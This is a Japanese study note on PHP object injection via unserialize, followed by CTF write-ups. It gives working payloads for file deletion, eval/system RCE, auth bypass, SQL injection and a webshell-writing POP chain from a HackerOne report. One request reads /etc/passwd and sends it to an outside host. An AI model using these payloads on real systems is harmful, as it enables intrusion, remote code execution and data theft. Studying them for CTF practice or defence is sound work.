<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [Unserialize](#unserialize)
  - [Serializeの基本](#serialize%E3%81%AE%E5%9F%BA%E6%9C%AC)
  - [__destruct](#__destruct)
  - [__wakeup](#__wakeup)
  - [AuthBypass TypeJuggling](#authbypass-typejuggling)
  - [AuthBypass ObjectReference](#authbypass-objectreference)
  - [POP chain](#pop-chain)
    - [__toString (SQL Injection)](#__tostring-sql-injection)
    - [\_\_destruct (webshell)](#%5C_%5C_destruct-webshell)
- [writeup](#writeup)
  - [\_\_destruct / SQL Injection (websec level04)](#%5C_%5C_destruct--sql-injection-websec-level04)
  - [RCE in PHP Object injetcion (Web 1 Kaspersky Industrial CTF 2018)](#rce-in-php-object-injetcion-web-1-kaspersky-industrial-ctf-2018)
  - [](#)
  - [](#-1)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Unserialize
## Serializeの基本
```php
<?php
class Example1{
    public $cache_file;
}
class Example2{
    public $cache_file;
    public $array = array("key" => 100);
}

$ex1 = new Example1();
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";N;}
$ex1->cache_file = "index.php";
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";s:9:"index.php";}

$ex2 = new Example2();
echo serialize($ex2)."\n";  // O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}

// O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}
// Oは「”Example2”というObjectをシリアル化している」の意味
// 8は”Example2”の文字数
// 2は「フィールドが二つある」の意味
// sはStringの意味？
// 10は"cache_file"の文字数
// Nは値がセットされていないという意味。{変数名;値}でワンセットっぽい
// 最後の"i:100;"はint型の値100という意味
?>
```
## __destruct
```php
class Example1
{
   public $cache_file;

   function __construct(){
      // some PHP code...
   }
   // インスタンス削除時にデストラクタを実行して$cache_fileを削除する
   function __destruct(){
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...

// GETメソッドの?data=以降の値をデシリアライズする
$user_data = unserialize($_GET['data']);

// some PHP code..
```
以下で、Example1クラスのオブジェクトとして復元して、Example1クラスのインスタンスを`$user_data`に代入するので、`$user_data`インスタンスが削除されるときに`../../index.php`が削除されてしまう！   
```txt
http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
```
## __wakeup

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        // このクラスをunserializeするときに__wakeup()を実行する
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);  // こんなことする場合ってあるのか？？
            }
        }
    }
    // $_REQUEST['r']はGETとPOSTとCOOKIEを合わせた連想配列。$_GET['r']とかと同じ
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```
GETのデータとかCookieのデータとかで`system("whoami")`を実行する。   
```txt
?r=O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
Cookie: r=O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D
```
## AuthBypass TypeJuggling
```php
// 一見、どう見ても安全に見えるが実はがちがちに脆弱。ヤバすぎてワロタ
data = unserialize($_COOKIE['auth']);

// "=="で比較しているため、TypeJugglingにより、 true(boolean) == "admin"(string) はTrueとなるので危険！
if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```
以下でAuthBypassのためのPayloadを作成。   
```php
<?php
$data = array("username" => true, "password" => true);
echo serialize($data)."\n"; // a:2:{s:8:"username";b:1;s:8:"password";b:1;}

// "username"のValueの値をBooleanのTrueにするとTypeJugglingによりAuthBypassできる！
echo gettype(true == "admin")." : ".(true == "admin")."\n";  // boolean : 1
echo gettype(true === "admin")." : ".(true === "admin")."\n"; // boolean : 
?>
```
作成した`a:2:{s:8:"username";b:1;s:8:"password";b:1;}`をURL encodeしてCookieにセットすればBypassできる！   
```txt
Cookie: auth=a%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
```
## AuthBypass ObjectReference
```php
<?php
class Object1{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```
以下で`$secretCode`と`$code`が同じ値を指すように参照代入したシリアライズデータを作成する。   
```php
<?php
class Object1{
    public $secretCode = "a";
    public $code;
    //public $code = &$secretCode;  // ここでやろうとするとerror。コンストラクタ内でやらないとだめらしい
    public function __construct(){
        // リファレンス(参照)代入。これで$secretCodeと$codeが同じ値を指すようになった！
        $this->code = &$this->secretCode;
    }
}
$obj1 = new Object1();
echo serialize($obj1);  // O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
?>
```
以下で認証を突破できる！   
```txt
?input=O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
```
## POP chain 
### __toString (SQL Injection)
```php
<?php
class Example3{
   protected $obj;

   function __construct(){
      // some PHP code...
   }
   // Exampleクラスのインスタンスが文字列として呼びだされたときに__toString()を実行
   function __toString(){
      if (isset($this->obj)) {
          // $this->objはインスタンスであるとして、そのインスタンスのgetValueメソッドを実行
          return $this->obj->getValue();
      }else{
          return "__toString else";
      }
   }
}

class SQL_Row_Value
{
   private $_table;
   private $id;

   // some PHP code...
   // getValue($id)とすると上の__toString内では引数無しで呼び出してるからエラーになる
   function getValue()
   {
      $sql = "SELECT * FROM {$this->_table} WHERE id = ".(int)$this->id;
      return $sql;
   }
}

// これをデシリアライズすればSQLインジェクションができる！
$user_data = unserialize('O:8:"Example3":1:{s:3:"obj";O:13:"SQL_Row_Value":2:{s:6:"_table";s:10:"users -- -";s:2:"id";i:2;}}');
echo $user_data;

// 実際に実行されるSQLクエリ
// SELECT * FROM users -- - WHERE id = 2
?>
```
以下でPayloadを作成するが、細部がうまいこといってないので手動で修正する。   
```php
<?php
class SQL_Row_Value{
   private $_table ="users -- -";
}

class Example3{
   protected $obj;

   function __construct()   {
      $this->obj = new SQL_Row_Value;
   }
}

print (serialize(new Example3));

// O:8:"Example3":1:{s:6:" * obj";O:13:"SQL_Row_Value":1:{s:21:"SQL_Row_Value_table";s:10:"users -- -";}}
?>
```
### \_\_destruct (webshell)
https://hackerone.com/reports/407552   

以下が最終的なpopchianのコード。   
デシリアライズするとき、`Gdn_Configuration`のインスタンスが作成されてコンストラクタが実行され、`new Gdn_ConfigurationSource()`によって`Gdn_ConfigurationSource`のインスタンスが作成される。   
`Gdn_ConfigurationSource`のインスタンスが作成されるとコンストラクタが実行され、各種フィールドに値がセットされる。   
```php
class Gdn_ConfigurationSource{
    public function __construct(){
        $this->Type = "file";
        $this->Source = "/var/www/html/conf/constants.php";
        $this->Group = 'a=eval($_GET[c]);//';
        $this->Settings[""] = "";       
        $this->Dirty = true;
        $this->ClassName = "Gdn_ConfigurationSource";
    }
}
class Gdn_Configuration {
    public $sources = [];
    public function __construct(){
        $this->sources['si'] = new Gdn_ConfigurationSource();
    }
}
// serialize(new Gdn_Configuration);
```

`Gdn_Configuration`クラスのデストラクタが呼ばれるのがentrypoint。   
[2]でshutdowm()メソッドが呼ばれて[3]が実行される。    
[3]ではshutdown()メソッドの中でshutdown()メソッドが呼ばれてる。これは多分別のクラスのshutdown()メソッドを探すことになるはず？？ここでは別の`Gdn_ConfigurationSource`クラスにあるshutdown()メソッドが該当する。     
上記のpopchainによって、`$source->shutdown(); // 3`の`$source`に`new Gdn_ConfigurationSource()`がセットされ、`インスタンス->shutdown()`となって`Gdn_ConfigurationSource`の`shutdown()`メソッドを実行できる！(実際に実行されるのはデストラクタが呼ばれるとき)   
```php
class Gdn_Configuration extends Gdn_Pluggable {

    ...

    /**
     *
     */
    public function __destruct() {
        if ($this->autoSave) {                      // 1
            $this->shutdown();                      // 2
        }
    }

    /**
     *
     */
    public function shutdown() {
        foreach ($this->sources as $source) {
            $source->shutdown();                    // 3
        }
    }
```
そして以下の`save()`メソッドが実行される。   
[6]のswitchで`$this->Type`の値が`'file'`のとき、[7]で`$group`に`'a=eval($_GET[c]);//'`がセットされる。   
次に[8]で`$options`連想配列に`'VarialbleName'`のValueとして値がセットされる。   
次に[9]で`array_merge()`で別の情報も`$options`に統合される。   
次に[10]で`Gdn_Configuration::format($data, $options)`で`'VarialbleName'`のValueをグローバル変数として設定するらしい。つまり、`$`にValueを追加した`$a=eval($_GET[c]);//`がグローバル変数名として設定される。また、これらをファイルの中身として`$fileContents`に保存する。   
[11]でランダムに作成した`$tmpFile`ファイルに`$fileContents`を書き込む。   
[12]で`$this->Source`にセットされた`"/var/www/html/conf/constants.php"`にファイル名を書き換える。これでWebshellが設置できる！   

```php
class Gdn_ConfigurationSource extends Gdn_Pluggable {

    ...

    /**
     *
     * 
     * @return bool|null
     * @throws Exception
     */
    public function save() {
        if (!$this->Dirty) {
            return null;
        }

        $this->EventArguments['ConfigDirty'] = &$this->Dirty;
        $this->EventArguments['ConfigNoSave'] = false;
        $this->EventArguments['ConfigType'] = $this->Type;
        $this->EventArguments['ConfigSource'] = $this->Source;
        $this->EventArguments['ConfigData'] = $this->Settings;
        $this->fireEvent('BeforeSave');

        if ($this->EventArguments['ConfigNoSave']) {
            $this->Dirty = false;
            return true;
        }

        // Check for and fire callback if one exists
        if ($this->Callback && is_callable($this->Callback)) {
            $callbackOptions = [];
            if (!is_array($this->CallbackOptions)) {
                $this->CallbackOptions = [];
            }

            $callbackOptions = array_merge($callbackOptions, $this->CallbackOptions, [
                'ConfigDirty' => $this->Dirty,
                'ConfigType' => $this->Type,
                'ConfigSource' => $this->Source,
                'ConfigData' => $this->Settings,
                'SourceObject' => $this
            ]);

            $configSaved = call_user_func($this->Callback, $callbackOptions);

            if ($configSaved) {
                $this->Dirty = false;
                return true;
            }
        }

        switch ($this->Type) {                              // 6
            case 'file':
                if (empty($this->Source)) {
                    trigger_error(errorMessage('You must specify a file path to be saved.', 'Configuration', 'Save'), E_USER_ERROR);
                }

                $checkWrite = $this->Source;
                if (!file_exists($checkWrite)) {
                    $checkWrite = dirname($checkWrite);
                }

                if (!is_writable($checkWrite)) {
                    throw new Exception(sprintf(t("Unable to write to config file '%s' when saving."), $this->Source));
                }

                $group = $this->Group;                                                              // 7
                $data = &$this->Settings;
                if ($this->Configuration) {
                    ksort($data, $this->Configuration->getSortFlag());
                }

                // Check for the case when the configuration is the group.
                if (is_array($data) && count($data) == 1 && array_key_exists($group, $data)) {
                    $data = $data[$group];
                }

                // Do a sanity check on the config save.
                if ($this->Source == Gdn::config()->defaultPath()) {
                    // Log root config changes
                    try {
                        $logData = $this->Initial;
                        $logData['_New'] = $this->Settings;
                        LogModel::insert('Edit', 'Configuration', $logData);
                    } catch (Exception $ex) {
                    }

                    if (!isset($data['Database'])) {
                        if ($pm = Gdn::pluginManager()) {
                            $pm->EventArguments['Data'] = $data;
                            $pm->EventArguments['Backtrace'] = debug_backtrace();
                            $pm->fireEvent('ConfigError');
                        }
                        return false;
                    }
                }

                $options = [
                    'VariableName' => $group,                                                   // 8
                    'WrapPHP' => true,
                    'ByLine' => true
                ];

                if ($this->Configuration) {
                    $options = array_merge($options, $this->Configuration->getFormatOptions());             // 9
                }

                // Write config data to string format, ready for saving
                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10

                if ($fileContents === false) {
                    trigger_error(errorMessage('Failed to define configuration file contents.', 'Configuration', 'Save'), E_USER_ERROR);
                }

                // Save to cache if we're into that sort of thing
                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this->Source);
                if ($this->Configuration && $this->Configuration->caching() && Gdn::cache()->type() == Gdn_Cache::CACHE_TYPE_MEMORY && Gdn::cache()->activeEnabled()) {
                    $cachedConfigData = Gdn::cache()->store($fileKey, $data, [
                        Gdn_Cache::FEATURE_NOPREFIX => true,
                        Gdn_Cache::FEATURE_EXPIRY => 3600
                    ]);
                }

                $tmpFile = tempnam(PATH_CONF, 'config');
                $result = false;
                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11
                    chmod($tmpFile, 0775);
                    $result = rename($tmpFile, $this->Source);                                              // 12
                }
```
実際に設置されたWebshellは以下の感じらしい。   
```txt
steven@pluto:/var/www/html/conf$ cat constants.php 
<?php if (!defined('APPLICATION')) exit();
$a=eval($_GET[c]);//[''] = '';

// Last edited by admin (172.16.175.1)2018-09-08 20:35:19
```
# writeup
## \_\_destruct / SQL Injection (websec level04)
http://websec.fr/  
- **entrypoint**  
User idの`1`を入力するとUsernameの値として`flag`という文字列が表示された。  
`source1.php`,`source2.php`が見れた。  
![image](https://user-images.githubusercontent.com/56021519/104459170-beb4d980-55ef-11eb-9785-5cc21365c4b8.png)  
**source1.php**  
どうみても入力を`unserialize`している箇所が脆弱。  
```php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>
```
**source2.php**  
以下のSQLクラスを利用してPHP Object Injectionするっぽい。`__construct()`は空っぽなので、`__destruct()`が使えそう。  
デストラクタの中で`execute()`メソッドで`$this->conn->query ($this->query);`のようにして`query`の中のSQL文を実行している。  
したがってここに任意のSQL文をセットした状態でserializeしてからunserializeすればSQL Injectionできそう！  
```php
<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>
```
`$row[username]`として`username`カラムの値を要素とした連想配列の値を出力するので、単純に`select password from users`とすると、`$row[username]`で表示できないので、`union select`で結合する。  
```php
$inject = "or";
class SQL {
    public $query = 'SELECT username FROM users WHERE id=-1 union select password from users users2 where id=1';
}

$ex1 = new SQL();
echo serialize($ex1)."\n";
echo base64_encode(serialize($ex1))."\n";

// 出力
// O:3:"SQL":1:{s:5:"query";s:89:"SELECT username FROM users WHERE id=-1 union select password from users users2 where id=1";}
// TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODk6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPS0xIHVuaW9uIHNlbGVjdCBwYXNzd29yZCBmcm9tIHVzZXJzIHVzZXJzMiB3aGVyZSBpZD0xIjt9 
```
これを`$_COOKIE['leet_hax0r']`にセットすると以下のようにFlagをゲット！  
![image](https://user-images.githubusercontent.com/56021519/104460136-08ea8a80-55f1-11eb-8b2d-0901870afec1.png)　　
- **payload**  
```txt
Cookie: leet_hax0r=TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODk6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPS0xIHVuaW9uIHNlbGVjdCBwYXNzd29yZCBmcm9tIHVzZXJzIHVzZXJzMiB3aGVyZSBpZD0xIjt9=
```
## RCE in PHP Object injetcion (Web 1 Kaspersky Industrial CTF 2018)
https://medium.com/@awidardi/web-1-kaspersky-industrial-ctf-2018-95af27db6b2  
- **entrypoint**  
`1+2`とかを計算できるWebサイトがあって、入力すると以下のようなオブジェクトを作成して実行できる。この文字列を表示する機能と文字列を与えてデシリアライズして計算できる機能がある。  
```txt
// 1+2
:10:”Expression”:3:{s:14:” Expression op”;s:3:”sum”;s:18:” Expression params”;a:2:{i:0;d:1;i:1;d:2;}s:9:”stringify”;s:5:”1 + 2";}

// 2/0
O:10:”Expression”:3:{s:14:” Expression op”;s:3:”div”;s:18:” Expression params”;a:2:{i:0;d:2;i:1;d:0;}s:9:”stringify”;s:5:”2 / 0";}
```
ここの、`div`の部分がメソッド名にあたり、`{i:0;d:2;i:1;d:0;}`が引数にあたる。  
なので、`exec`,`ls -al`とかに書き換えればRCEできる！  
以下で`file_get_contents`,`index.php`でソースを表示できる！  
```txt
O:10:”Expression”:3:{s:14:” Expression op”;s:17:”file_get_contents”;s:18:” Expression params”;s:9:”index.php”;s:9:”stringify”;s:5:”2 / 0";}
```
- **payload**  
```txt
O:10:”Expression”:3:{s:14:” Expression op”;s:4:”exec”;s:18:” Expression params”;s:6:”ls -la”;s:9:”stringify”;s:5:”2 / 0";}
```
## Local File Disclosure / phar:// / file_get_contetns (hitcon2018 baby-cake)
https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake  
https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge  
- **entrypoint**  
CAKE PHPで書かれたソースが配布される。  
mainの処理は`src/Controller/PagesController.php`に書かれている。  
`cache_get($key)`の中に`unserialize`があって脆弱性があるっぽいが、その中には`cache_set`で`serialize($response->headers)`でシリアライズした文字列しか入りえないので脆弱ではない。  
`display(...$path)`関数の中の`$response = $this->httpclient($method, $url, $headers, $data);`で`?url=`に指定したURLに`?data`で指定したdataを伴ってアクセスしてくれるらしい。  
つまり、例えばPOSTで`/?url=http://IP&data=test`とアクセスすれば、このWebサーバーが`http://IP`に対して`data=test`をデータとしてPOSTリクエストでアクセスしてくれるっぽい。  
`if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )`でホワイトリストでプロトコルをチェックしているので、`phar://`みたいにアクセスさせることはできない…  
`$response = $this->httpclient($method, $url, $headers, $data);`で`httpclient`メソッドの中の`new Client()`でCLientインスタンスを作成している。  
したがって次は`vendor/cakephp/cakephp/src/Http/Client.php`を見る。  
```php
<?php

namespace App\Controller;
use Cake\Core\Configure;
use Cake\Http\Client;
use Cake\Http\Exception\ForbiddenException;
use Cake\Http\Exception\NotFoundException;
use Cake\View\Exception\MissingTemplateException;

class DymmyResponse {
    function __construct($headers, $body) {
        $this->headers = $headers;
        $this->body = $body;
    }
}

class PagesController extends AppController {

    private function httpclient($method, $url, $headers, $data) {
        $options = [
            'headers' => $headers, 
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }

    private function back() {
        return $this->render('pages');
    }

    private function _cache_dir($key){
        $ip = $this->request->getEnv('REMOTE_ADDR');
        $index = sprintf('mycache/%s/%s/', $ip, $key);
        return CACHE . $index;
    }

    private function cache_set($key, $response) {
        $cache_dir = $this->_cache_dir($key);
        if ( !file_exists($cache_dir) ) {
            mkdir($cache_dir, 0700, true);
            file_put_contents($cache_dir . "body.cache", $response->body);
            file_put_contents($cache_dir . "headers.cache", serialize($response->headers));
        }
    }

    private function cache_get($key) {
        $cache_dir = $this->_cache_dir($key);
        if (file_exists($cache_dir)) {
            $body   = file_get_contents($cache_dir . "/body.cache");
            $headers = file_get_contents($cache_dir . "/headers.cache");
            
            $body = "<!-- from cache -->\n" . $body;
            $headers = unserialize($headers);
            return new DymmyResponse($headers, $body);
        } else {
            return null;
        }
    }

    public function display(...$path) {    
        $request  = $this->request;
        $data = $request->getQuery('data');
        $url  = $request->getQuery('url');
        if (strlen($url) == 0) 
            return $this->back();

        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );
        if (strlen($scheme) == 0 || !in_array($scheme, ['http', 'https']))
            return $this->back();

        $method = strtolower( $request->getMethod() );
        if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )
            return $this->back();


        $headers = [];
        foreach ($request->getHeaders() as $key => $value) {
            if (in_array( strtolower($key), ['host', 'connection', 'expect', 'content-length'] ))
                continue;
            if (count($value) == 0)
                continue;

            $headers[$key] = $value[0];
        }

        $key = md5($url);
        if ($method == 'get') {
            $response = $this->cache_get($key);
            if (!$response) {
                $response = $this->httpclient($method, $url, $headers, null);
                $this->cache_set($key, $response);                
            }
        } else {
            $response = $this->httpclient($method, $url, $headers, $data);
        }

        foreach ($response->headers as $key => $value) {
            if (strtolower($key) == 'content-type') {
                $this->response->type(array('type' => $value));
                $this->response->type('type');
                continue;
            }
            $this->response->withHeader($key, $value);
        }

        $this->response->body($response->body);
        return $this->response;
    }
    private function httpclient($method, $url, $headers, $data) {
        $options = [
            'headers' => $headers, 
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }
}
```
`vendor/cakephp/cakephp/src/Http/Client.php`  
`src/Controller/PagesController.php`の`httpclient`メソッドで、`$http->$method($url, $data, $options);`を実行するが、POSTを指定している場合は`$method`の中身は`post`なので、`$http->post()`が呼び出されることになる。  
`post`メソッドの中では`$this->_doRequest(Request::METHOD_POST, $url, $data, $options);`で`_doRequest`メソッドを実行する。  
この中では`$request = $this->_createRequest(`で`_createRequest`メソッドを実行してその中では`Request`クラスのインスタンスを作成している。  
したがって、次は`vendor/cakephp/cakephp/src/Http/Client/Request.php`の中身をみる。  
```php
    /**
     * Default configuration for the client.
     *
     * @var array
     */
    protected $_defaultConfig = [
        'adapter' => 'Cake\Http\Client\Adapter\Stream',

    ...

    public function __construct($config = [])
    {
        $this->setConfig($config);

        $adapter = $this->_config['adapter'];
        $this->setConfig('adapter', null);
        if (is_string($adapter)) {
            $adapter = new $adapter();
        }
        $this->_adapter = $adapter;


    ...

    /**
     * Do a POST request.
     *
     * @param string $url The url or path you want to request.
     * @param mixed $data The post data you want to send.
     * @param array $options Additional options for the request.
     * @return \Cake\Http\Client\Response
     */
    public function post($url, $data = [], array $options = [])
    {
        $options = $this->_mergeOptions($options);
        $url = $this->buildUrl($url, [], $options);

        return $this->_doRequest(Request::METHOD_POST, $url, $data, $options);
    }

    ...

    /**
     * Helper method for doing non-GET requests.
     *
     * @param string $method HTTP method.
     * @param string $url URL to request.
     * @param mixed $data The request body.
     * @param array $options The options to use. Contains auth, proxy, etc.
     * @return \Cake\Http\Client\Response
     */
    protected function _doRequest($method, $url, $data, $options)
    {
        $request = $this->_createRequest(
            $method,
            $url,
            $data,
            $options
        );

        return $this->send($request, $options);
    }

    ...

    /**
     * Creates a new request object based on the parameters.
     *
     * @param string $method HTTP method name.
     * @param string $url The url including query string.
     * @param mixed $data The request body.
     * @param array $options The options to use. Contains auth, proxy, etc.
     * @return \Cake\Http\Client\Request
     */
    protected function _createRequest($method, $url, $data, $options)
    {
        $headers = isset($options['headers']) ? (array)$options['headers'] : [];
        if (isset($options['type'])) {
            $headers = array_merge($headers, $this->_typeHeaders($options['type']));
        }
        if (is_string($data) && !isset($headers['Content-Type']) && !isset($headers['content-type'])) {
            $headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }

        $request = new Request($url, $method, $headers, $data);

    ...

    }
```
`vendor/cakephp/cakephp/src/Http/Client/Request.php`  
`__construct`で`$this->body($data)`で`?data=`の値を`body`メソッドに引数として与えている。  
`form`メソッドの中では、`if (is_array($body)) {`の中で`?body[test]=aaaa`みたいに値がArrayの場合に`$formData->addMany($body);`で`addMany($body)`を実行する。  
この`addMany`メソッドは`$formData = new FormData();`より`FormData`クラスのメソッドなので、次は`vendor/cakephp/cakephp/src/Http/Client/FormData.php`を見る。  
```php
    /**
     * Constructor
     *
     * Provides backwards compatible defaults for some properties.
     *
     * @param string $url The request URL
     * @param string $method The HTTP method to use.
     * @param array $headers The HTTP headers to set.
     * @param array|string|null $data The request body to use.
     */
    public function __construct($url = '', $method = self::METHOD_GET, array $headers = [], $data = null)
    {
        $this->validateMethod($method);
        $this->method = $method;
        $this->uri = $this->createUri($url);
        $headers += [
            'Connection' => 'close',
            'User-Agent' => 'CakePHP'
        ];
        $this->addHeaders($headers);
        $this->body($data);
    }

    ...

    /**
     * Get/set the body/payload for the message.
     *
     * Array data will be serialized with Cake\Http\FormData,
     * and the content-type will be set.
     *
     * @param string|array|null $body The body for the request. Leave null for get
     * @return mixed Either $this or the body value.
     */
    public function body($body = null)
    {
        if ($body === null) {
            $body = $this->getBody();

            return $body ? $body->__toString() : '';
        }
        if (is_array($body)) {
            $formData = new FormData();
            $formData->addMany($body);
            $this->header('Content-Type', $formData->contentType());
            $body = (string)$formData;
        }
        $stream = new Stream('php://memory', 'rw');
        $stream->write($body);
        $this->stream = $stream;

        return $this;
    }
```
`vendor/cakephp/cakephp/src/Http/Client/FormData.php`  
`addMany`メソッドの中で`?data[test]=aaa`を`$name=test`,`$value=aaa`に分解して`$this->add($name, $value);`で`add`メソッドを実行している。  
`add`メソッドの中では`} elseif (is_string($value) && strlen($value) && $value[0] === '@') {`で`?data[test]=@aaa`みたいに`@`から始まっている場合は`$this->addFile($name, $value);`で`addFile`メソッドを実行する。  
`addFile`メソッドで`$value = substr($value, 1);`で`@`を取り除いて`$content = file_get_contents($value);`でファイルを読みだす。  
つまり、`?url=http://IP&data[test]=@/etc/passwd`とすれば`/etc/passwd`をdataとして`http://IP`にPOSTしてくれる！！！   
これでLocal File Disclosureができる！！！！  
```php
    /**
     * Add a new part to the data.
     *
     * The value for a part can be a string, array, int,
     * float, filehandle, or object implementing __toString()
     *
     * If the $value is an array, multiple parts will be added.
     * Files will be read from their current position and saved in memory.
     *
     * @param string|\Cake\Http\Client\FormData $name The name of the part to add,
     *   or the part data object.
     * @param mixed $value The value for the part.
     * @return $this
     */
    public function add($name, $value = null)
    {
        if (is_array($value)) {
            $this->addRecursive($name, $value);
        } elseif (is_resource($value)) {
            $this->addFile($name, $value);
        } elseif (is_string($value) && strlen($value) && $value[0] === '@') {
            trigger_error(
                'Using the @ syntax for file uploads is not safe and is deprecated. ' .
                'Instead you should use file handles.',
                E_USER_DEPRECATED
            );
            $this->addFile($name, $value);
        } elseif ($name instanceof FormDataPart && $value === null) {
            $this->_hasComplexPart = true;
            $this->_parts[] = $name;
        } else {
            $this->_parts[] = $this->newPart($name, $value);
        }

        return $this;
    }

    /**
     * Add multiple parts at once.
     *
     * Iterates the parameter and adds all the key/values.
     *
     * @param array $data Array of data to add.
     * @return $this
     */
    public function addMany(array $data)
    {
        foreach ($data as $name => $value) {
            $this->add($name, $value);
        }

        return $this;
    }

    /**
     * Add either a file reference (string starting with @)
     * or a file handle.
     *
     * @param string $name The name to use.
     * @param mixed $value Either a string filename, or a filehandle.
     * @return \Cake\Http\Client\FormDataPart
     */
    public function addFile($name, $value)
    {
        $this->_hasFile = true;

        $filename = false;
        $contentType = 'application/octet-stream';
        if (is_resource($value)) {
            $content = stream_get_contents($value);
            if (stream_is_local($value)) {
                $finfo = new finfo(FILEINFO_MIME);
                $metadata = stream_get_meta_data($value);
                $contentType = $finfo->file($metadata['uri']);
                $filename = basename($metadata['uri']);
            }
        } else {
            $finfo = new finfo(FILEINFO_MIME);
            $value = substr($value, 1);
            $filename = basename($value);
            $content = file_get_contents($value);
            $contentType = $finfo->file($value);
        }
        $part = $this->newPart($name, $content);
        $part->type($contentType);
        if ($filename) {
            $part->filename($filename);
        }
        $this->add($part);

        return $part;
    }
```
以下で`/etc/passwd`が得られたらしい。  
```txt
POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/passwd
```

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
